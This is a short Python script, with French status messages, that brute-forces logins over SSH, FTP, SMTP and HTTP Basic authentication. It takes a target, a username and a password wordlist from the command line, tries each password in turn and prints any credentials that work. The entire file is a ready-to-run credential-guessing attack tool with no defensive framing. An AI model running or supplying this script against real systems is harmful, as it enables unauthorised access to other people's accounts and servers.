#import paramiko, sys, argparse, ftplib, smtplib, requests
from __future__ import print_function
import paramiko, sys, argparse, ftplib, smtplib, requests
from requests.auth import HTTPBasicAuth

import urllib3



def ssh(IP, UserName, WordList):

    ssh = paramiko.SSHClient()
    ssh.load_system_host_keys()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print ("Attaque SSH en cours")

    P = open(WordList, 'r')
    for line in P.readlines():
        passWord = line.strip('\r\n')
        try:
            ssh.connect(IP, username=UserName, password=passWord, timeout=2.5)
            ssh.close()
            print ("\n[*]" +str(IP) + " SSH Login Found : "+UserName+":"+passWord)
            sys.exit(1)
        except paramiko.AuthenticationException:
            pass

    return(None, None)




def ftp(IP, UserName, WordList):
    P = open(WordList, 'r')
    print ("Attaque en cours")
    for line in P.readlines():
        passWord = line.strip('\r\n')
        try:
            ftp = ftplib.FTP(IP)
            ftp.login(UserName, passWord)
            print ("\n[*]" +str(IP) + " FTP Login Found : "+UserName+":"+passWord)
            ftp.quit()
            sys.exit(1)
        except:
            pass

def smtp(IP, UserName, WordList):
    P = open(WordList, 'r')
    print ("Attaque SMTP en cours")
    for line in P.readlines():
        passWord = line.strip('\r\n')
        try:
            smtp = smtplib.SMTP(IP)
            smtp.login(UserName, passWord)
            print ("\n[*]" +str(IP) + " SMTP Login Found : "+UserName+":"+passWord)
            smtp.quit()
            sys.exit(1)
        except:
            pass

def AuthBasic(IP, UserName, WordList):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    P = open(WordList, 'r')
    print ("Attaque en cours")
    for line in P.readlines():
        passWord = line.strip('\r\n')
        res = requests.get(IP, auth=HTTPBasicAuth(UserName, passWord), verify=False)
        if res.status_code == 200:
            print ("\n[*]" +str(IP) + " HTTP Login Found : "+UserName+":"+passWord)



parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target")
parser.add_argument("-u", "--username")
parser.add_argument("-w", "--wordlist")
parser.add_argument("-m", "--protocol")

args = parser.parse_args()

IP = args.target
UserName = args.username
WordList = args.wordlist
Protocol = args.protocol

if Protocol == "ssh":
    ssh(IP, UserName, WordList)
if Protocol == "ftp":
    ftp(IP, UserName, WordList)
if Protocol == "smtp":
    smtp(IP, UserName, WordList)
if Protocol == "http":
    AuthBasic(IP, UserName, WordList)
